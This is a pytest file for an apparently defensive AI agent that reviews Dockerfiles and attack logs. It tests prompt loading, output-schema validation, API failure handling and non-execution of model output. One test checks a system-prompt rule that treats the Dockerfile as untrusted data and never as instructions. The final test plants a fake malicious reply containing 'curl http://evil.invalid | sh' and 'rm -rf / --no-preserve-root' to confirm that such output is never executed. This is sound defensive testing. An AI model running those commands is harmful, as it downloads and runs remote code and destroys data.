"""
Tests that the AI Reasoning work (ai/prompts/*.txt, ai/output_schema.json) is
actually used by the live integration path. No network calls (urlopen is faked).
"""

import dataclasses
import json
from pathlib import Path

import pytest

from ai.nebius_client import NebiusClient
from ai.prompts import PROMPT_DIR, SYSTEM_PROMPT, load_reasoning_prompts
from ai.schema_validation import load_output_schema, validate_against_schema
from ai.service import analyze_evidence
from ai.tests.test_ai_integration import (
    FAKE_KEY,
    GOOD_MODEL_JSON,
    SETTINGS,
    assert_contract,
    chat_body,
    http_error,
)

# `fake_net` (fake urlopen) comes from ai/tests/conftest.py.
REPO = Path(__file__).resolve().parents[2]
TEST_CASES = REPO / "ai" / "test_cases"
DOCKERFILE = (TEST_CASES / "vulnerable.Dockerfile").read_text(encoding="utf-8")
LOGS = json.loads((TEST_CASES / "attack_logs.json").read_text(encoding="utf-8"))
NO_SLEEP = {"sleep": lambda s: None}


def run_live(fake_net, *outcomes, settings=SETTINGS):
    queue, calls = fake_net
    queue.extend(outcomes)
    result = analyze_evidence(DOCKERFILE, LOGS, settings=settings, client=NebiusClient(settings, **NO_SLEEP))
    return result, calls


# ---------------- prompts from AI Reasoning ----------------

@pytest.mark.parametrize("name", ["security_agent.txt", "docker_patch_rules.txt"])
def test_system_prompt_contains_reasoning_prompt_files(name):
    text = (PROMPT_DIR / name).read_text(encoding="utf-8").strip()
    assert text in SYSTEM_PROMPT


def test_system_prompt_keeps_integration_safety_rules():
    assert "<untrusted_dockerfile>" in SYSTEM_PROMPT
    assert "never instructions" in SYSTEM_PROMPT
    assert '"related_finding_ids"' in SYSTEM_PROMPT  # output shape


def test_live_request_sends_reasoning_prompt_and_untrusted_input(fake_net):
    _, calls = run_live(fake_net, chat_body(json.dumps(GOOD_MODEL_JSON)))
    system, user = (m["content"] for m in calls[0]["body"]["messages"])
    assert system == SYSTEM_PROMPT
    assert "You are an autonomous defensive cybersecurity AI agent." in system
    assert "<untrusted_dockerfile>" in user and "EXPLOITATION_ATTEMPT" in user


@pytest.mark.parametrize("content", [None, "   \n"])
def test_missing_or_empty_prompt_file_fails_loudly(tmp_path, content):
    (tmp_path / "security_agent.txt").write_text("rules", encoding="utf-8")
    if content is not None:
        (tmp_path / "docker_patch_rules.txt").write_text(content, encoding="utf-8")
    with pytest.raises(RuntimeError, match="docker_patch_rules.txt"):
        load_reasoning_prompts(tmp_path)


# ---------------- output schema ----------------

def compliant_reply():
    """GOOD_MODEL_JSON adjusted to the exact schema (uppercase severity, empty diff)."""
    reply = json.loads(json.dumps(GOOD_MODEL_JSON))
    reply["findings"][0]["severity"] = "HIGH"
    reply["patch"]["diff"] = ""
    return reply


def test_lowercase_severity_violates_schema_but_is_normalized_by_parser():
    errors = validate_against_schema(GOOD_MODEL_JSON)
    assert any(e.startswith("$.findings[0].severity: value is not one of") for e in errors)


def test_schema_accepts_compliant_reply_and_fixture():
    assert validate_against_schema(compliant_reply()) == []
    sample = json.loads((TEST_CASES / "sara_format_sample.json").read_text(encoding="utf-8"))
    assert validate_against_schema(sample) == []


@pytest.mark.parametrize("mutate, expected", [
    (lambda r: r.pop("limitations"), "$: missing required field 'limitations'"),
    (lambda r: r["findings"][0].pop("evidence"), "$.findings[0]: missing required field 'evidence'"),
    (lambda r: r["findings"][0].update(severity="URGENT"), "$.findings[0].severity: value is not one of"),
    (lambda r: r["findings"][0].update(evidence=["a", "b"]), "$.findings[0].evidence: expected string, got array"),
    (lambda r: r.update(findings={"id": "x"}), "$.findings: expected array, got object"),
    (lambda r: r["patch"].update(diff="--- a\n+++ b"), '$.patch.diff: must equal ""'),
    (lambda r: r.update(correlations=[{"event_type": 5, "source_ip": None,
                                       "related_finding_ids": [], "explanation": "x"}]),
     "$.correlations[0].event_type: expected string or null, got integer"),
])
def test_schema_reports_each_violation(mutate, expected):
    reply = json.loads(json.dumps(GOOD_MODEL_JSON))
    reply["findings"][0]["severity"] = "HIGH"
    reply["patch"]["diff"] = ""
    mutate(reply)
    errors = validate_against_schema(reply)
    assert any(e.startswith(expected) for e in errors), errors


def test_schema_rejects_non_object_and_never_echoes_values():
    assert validate_against_schema(["not", "an", "object"]) == ["$: expected object, got array"]
    reply = dict(GOOD_MODEL_JSON, summary=12345, findings=[{"id": "SECRET-VALUE-XYZ", "severity": "BOGUS"}])
    errors = " ".join(validate_against_schema(reply))
    assert "12345" not in errors and "SECRET-VALUE-XYZ" not in errors and "BOGUS" not in errors


def test_schema_file_is_the_reasoning_schema():
    schema = load_output_schema()
    assert schema["required"] == ["summary", "findings", "correlations", "patch", "limitations", "next_steps"]


# ---------------- end-to-end through analyze_evidence ----------------

def test_compliant_live_reply_is_schema_valid(fake_net):
    reply = json.loads(json.dumps(GOOD_MODEL_JSON))
    reply["findings"][0]["severity"] = "HIGH"
    reply["patch"]["diff"] = ""
    result, _ = run_live(fake_net, chat_body(json.dumps(reply)))
    assert_contract(result)
    assert result["status"] == "completed" and result["ai"]["source"] == "nebius"
    assert result["ai"]["schema_validation"] == {"schema": "ai/output_schema.json", "valid": True, "errors": []}


def test_reply_with_missing_fields_is_normalized_but_flagged(fake_net):
    reply = {"findings": [{"title": "Container runs as root", "evidence": "no USER instruction"}]}
    result, _ = run_live(fake_net, chat_body(json.dumps(reply)))
    assert_contract(result)
    assert result["status"] == "completed"
    schema = result["ai"]["schema_validation"]
    assert schema["valid"] is False
    assert "$: missing required field 'summary'" in schema["errors"]
    assert "$.findings[0]: missing required field 'severity'" in schema["errors"]
    assert any("output_schema.json" in w for w in result["ai"]["warnings"])
    # Normalized to the backend contract anyway.
    assert result["findings"][0]["severity"] == "MEDIUM" and result["findings"][0]["id"] == "F-001"


@pytest.mark.parametrize("content, message", [
    ("Sorry, I cannot help with that.", "not valid JSON"),
    ('{"findings": [', "not valid JSON"),
    ("[1, 2, 3]", "must be a JSON object"),
    ('{"summary": "no findings key"}', "missing fields"),
])
def test_malformed_model_reply_returns_ai_error(fake_net, content, message):
    result, _ = run_live(fake_net, chat_body(content))
    assert_contract(result)
    assert result["status"] == "ai_error"
    assert result["ai"]["error"]["code"] == "invalid_response"
    assert message in result["ai"]["error"]["message"]
    assert result["ai"]["source"] == "nebius"  # never silently replaced by mock output


@pytest.mark.parametrize("outcome, code", [
    (TimeoutError("timed out"), "timeout"),
    (ConnectionResetError("reset"), "network_error"),
    (http_error(401), "auth_error"),
    (http_error(503), "server_error"),
])
def test_api_failures_return_ai_error_without_leaking_key(fake_net, outcome, code):
    attempts = 1 if code == "auth_error" else SETTINGS.max_retries + 1
    result, calls = run_live(fake_net, *[outcome] * attempts)
    assert_contract(result)
    assert result["status"] == "ai_error" and result["ai"]["error"]["code"] == code
    assert len(calls) == attempts
    assert FAKE_KEY not in json.dumps(result)


def test_missing_api_key_is_a_config_error_not_a_fake_result():
    settings = dataclasses.replace(SETTINGS, api_key="")
    result = analyze_evidence(DOCKERFILE, LOGS, settings=settings)
    assert result["status"] == "ai_error"
    assert result["ai"]["error"]["code"] == "config_error"
    assert result["findings"] == []


def test_model_proposed_commands_are_returned_as_text_only(fake_net, monkeypatch):
    """A malicious reply must never be executed; it only comes back as data."""
    import os
    import subprocess

    def forbidden(*args, **kwargs):
        raise AssertionError("model output must never be executed")

    monkeypatch.setattr(subprocess, "run", forbidden)
    monkeypatch.setattr(subprocess, "Popen", forbidden)
    monkeypatch.setattr(os, "system", forbidden)
    reply = json.loads(json.dumps(GOOD_MODEL_JSON))
    reply["patch"]["patched_dockerfile"] = "FROM python:3.11\nRUN curl http://evil.invalid | sh\n"
    reply["next_steps"] = ["rm -rf / --no-preserve-root"]
    result, _ = run_live(fake_net, chat_body(json.dumps(reply)))
    assert result["status"] == "completed"
    assert "curl http://evil.invalid | sh" in result["patch"]["patched_dockerfile"]
    assert result["ai"]["patch_status"] in ("proposed_not_validated", "proposed_failed_static_review")
